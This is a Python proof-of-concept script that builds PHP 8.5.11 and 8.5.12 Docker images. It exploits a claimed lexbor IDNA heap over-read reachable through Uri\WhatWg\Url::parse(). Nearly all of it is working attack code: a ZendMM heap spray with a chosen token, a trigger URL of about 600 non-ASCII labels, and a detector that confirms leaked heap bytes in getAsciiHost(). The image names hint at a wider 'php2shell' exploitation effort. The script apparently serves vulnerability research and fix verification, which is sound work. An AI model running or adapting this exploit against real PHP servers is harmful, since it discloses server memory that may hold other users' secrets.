#!/usr/bin/env python3
# INDEX: lexbor idna toascii buffer-grow heap over-read | all | needs url::parse() sink
"""lexbor_idna_leak.py - PoC for the lexbor IDNA uninitialized-memory read /
heap disclosure (ext/lexbor/lexbor/unicode/idna.c; NET-NEW bug, ChangeLog item
(c), distinct from CVE-2026-109618/109619).

Reachable zero-config / non-DOM via Uri\\WhatWg\\Url::parse() on a special-scheme
URL with ~600 non-ASCII labels: the IDNA ToASCII output overflows the on-stack
buffer[4096] and forces a lexbor_malloc grow whose un-copied ~4096B prefix leaks
stale ZendMM heap out through getAsciiHost(). Spray-and-recognize: a sprayed
forbidden-byte-free token comes back as the host string though the input URL
never contained it. VULN 8.5.11, FIXED 8.5.12 (memcpy added). Builds/reuses a
plain CLI PHP image (ext/uri + ext/lexbor are always compiled in).

Usage:
    python3 -I poc/bugs/lexbor_idna_leak.py                      # leak demo on 8.5.11
    python3 -I poc/bugs/lexbor_idna_leak.py --php-tag php-8.5.12 # A/B: no leak
    python3 -I poc/bugs/lexbor_idna_leak.py --token PWNED123 --trials 10
"""
import argparse
import os
import subprocess
import sys
import tempfile

# --- image / build -----------------------------------------------------------

IMAGE_8511 = "php2shell-uri-8511:latest"
IMAGE_8512 = "php2shell-uri-8512:latest"

DOCKERFILE = r"""
FROM debian:trixie-slim AS build
RUN apt-get update && apt-get install -y --no-install-recommends \
        ca-certificates git autoconf bison re2c make gcc g++ pkg-config \
    && rm -rf /var/lib/apt/lists/*
ARG PHP_TAG=php-8.5.11
RUN git clone --depth 1 --branch ${PHP_TAG} https://github.com/php/php-src /src
WORKDIR /src
RUN ./buildconf --force
RUN ./configure --disable-all --enable-cli --enable-session \
        --without-pear --disable-cgi --disable-phpdbg
RUN make -j"$(nproc)" >/dev/null

FROM debian:trixie-slim
RUN apt-get update && apt-get install -y --no-install-recommends libstdc++6 \
    && rm -rf /var/lib/apt/lists/*
COPY --from=build /src/sapi/cli/php /usr/local/bin/php
WORKDIR /work
CMD ["php", "-v"]
"""

# PHP driver: fresh process == spray then parse (the reliable single-shot mode).
# argv: <token> <nlabels>.  Emits machine-parseable KEY=VALUE lines on stdout.
PHP_DRIVER = r"""<?php
error_reporting(E_ALL); ini_set('display_errors','0');
$token   = $argv[1] ?? 'HeapLeakZZ';          // letters/digits only -> all pass
$nlabels = (int)($argv[2] ?? 600);            // the forbidden-domain map

if (!class_exists('Uri\\WhatWg\\Url')) { echo "CLASS=no\n"; exit(0); }
echo "CLASS=yes PHP=".PHP_VERSION."\n";

// --- spray: fill + free ~20KB ZendMM blocks with the repeating token, so the
// idna grow's lexbor_malloc(~16KB) reclaims a token-filled freed chunk.
for ($r = 0; $r < 8; $r++) {
    $a = [];
    for ($i = 0; $i < 64; $i++) { $a[] = str_repeat($token, 2000 + ($i * 2)); }
    $a = null;
}

// --- trigger URL: special scheme + nlabels non-ASCII 'ä' labels
$labels = [];
for ($i = 0; $i < $nlabels; $i++) { $labels[] = "\xC3\xA4"; }
$host = implode('.', $labels);
$url  = 'http://' . $host . '/';
echo "URLBYTES=".strlen($url)." INPUT_HAS_TOKEN=".(strpos($url,$token)!==false?'1':'0')."\n";

$errs = null;
$u = @Uri\WhatWg\Url::parse($url, null, $errs);
if ($u === null) { echo "PARSE=null\n"; exit(0); }
echo "PARSE=ok\n";

$h = (string) $u->getAsciiHost();
$occ = substr_count($h, $token);
// longest run of a single repeated byte (reports the 'A'-style contiguous leak)
$len = strlen($h); $maxrun = 0; $cur = 1;
for ($i = 1; $i < $len; $i++) { if ($h[$i] === $h[$i-1]) { $cur++; if ($cur>$maxrun) $maxrun=$cur; } else $cur=1; }
echo "ASCIIHOST_LEN=$len TOKEN_OCC=$occ MAXRUN=$maxrun\n";
echo "LEAKBYTES=".($occ * strlen($token))."\n";
echo "HEAD_HEX=".bin2hex(substr($h, 0, 48))."\n";
echo "HEAD_ASC=".substr($h, 0, 48)."\n";
"""


def have_image(image):
    r = subprocess.run(["docker", "images", "-q", image],
                       capture_output=True, text=True)
    return bool(r.stdout.strip())


def build_image(php_tag, image, quiet=False):
    """Build the CLI+ext/uri image for php_tag if it does not already exist."""
    if have_image(image):
        if not quiet:
            print(f"[*] reusing existing image {image}")
        return True
    print(f"[*] building {image} (PHP {php_tag} + ext/uri/lexbor); "
          f"first build clones+compiles php-src, ~3-5 min ...")
    with tempfile.TemporaryDirectory() as ctx:
        with open(os.path.join(ctx, "Dockerfile"), "w") as f:
            f.write(DOCKERFILE)
        b = subprocess.run(
            ["docker", "build", "-q",
             "--build-arg", f"PHP_TAG={php_tag}",
             "-t", image, "-f", os.path.join(ctx, "Dockerfile"), ctx],
            text=True)
    if b.returncode != 0:
        print(f"[-] build of {image} failed")
        return False
    return True


def run_once(image, token, nlabels, timeout=60):
    """Run the driver once in a fresh container; return dict of KEY=VALUE lines."""
    with tempfile.TemporaryDirectory() as d:
        drv = os.path.join(d, "drv.php")
        with open(drv, "w") as f:
            f.write(PHP_DRIVER)
        p = subprocess.run(
            ["docker", "run", "--rm", "-v", f"{d}:/w:ro", image,
             "php", "/w/drv.php", token, str(nlabels)],
            capture_output=True, text=True, timeout=timeout)
    out = {}
    for line in (p.stdout or "").split("\n"):
        for tok in line.strip().split(" "):
            if "=" in tok:
                k, v = tok.split("=", 1)
                out[k] = v
    out["_raw"] = p.stdout or ""
    out["_err"] = p.stderr or ""
    return out


def demo(image, label, token, nlabels, trials):
    """Run `trials` fresh-process attempts; print per-trial outcome + summary."""
    print(f"\n=== {label} ({image}) token={token!r} nlabels={nlabels} "
          f"trials={trials} ===")
    parse_ok = parse_null = leaked = 0
    first_leak = None
    class_ok = False
    for t in range(trials):
        r = run_once(image, token, nlabels)
        class_ok = class_ok or (r.get("CLASS") == "yes")
        if r.get("PARSE") == "ok":
            parse_ok += 1
            occ = int(r.get("TOKEN_OCC", "0"))
            if occ > 0:
                leaked += 1
                if first_leak is None:
                    first_leak = r
        elif r.get("PARSE") == "null":
            parse_null += 1
    print(f"  class_exists(Uri\\WhatWg\\Url) = {class_ok}")
    print(f"  parse_ok={parse_ok} parse_null={parse_null} "
          f"token_leaked={leaked}/{trials}")
    if first_leak:
        print(f"  LEAK: {int(first_leak['TOKEN_OCC'])} copies of {token!r} "
              f"(~{first_leak['LEAKBYTES']} bytes) in getAsciiHost(); "
              f"input_has_token={first_leak.get('INPUT_HAS_TOKEN')}")
        print(f"        head.ascii = {first_leak.get('HEAD_ASC','')}")
        print(f"        head.hex   = {first_leak.get('HEAD_HEX','')}")
    return {"class_ok": class_ok, "parse_ok": parse_ok,
            "parse_null": parse_null, "leaked": leaked, "sample": first_leak}


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--php-tag", default="php-8.5.11",
                    help="php-src git tag to build/run (default php-8.5.11, VULN)")
    ap.add_argument("--image", default=None,
                    help="docker image tag (default derived from --php-tag)")
    ap.add_argument("--token", default="HeapLeakZZ",
                    help="spray token (letters/digits only; forbidden-byte-free)")
    ap.add_argument("--nlabels", type=int, default=600)
    ap.add_argument("--trials", type=int, default=5)
    args = ap.parse_args()

    image = args.image or (IMAGE_8511 if args.php_tag == "php-8.5.11"
                           else IMAGE_8512 if args.php_tag == "php-8.5.12"
                           else f"php2shell-uri-{args.php_tag}:latest")
    if not build_image(args.php_tag, image):
        sys.exit(2)
    res = demo(image, args.php_tag, args.token, args.nlabels, args.trials)
    if res["leaked"]:
        print("\n[+] heap bytes disclosed to userland via getAsciiHost()")
    else:
        print("\n[-] no token leak observed in this run "
              "(expected on 8.5.12 / FIXED builds)")


if __name__ == "__main__":
    main()
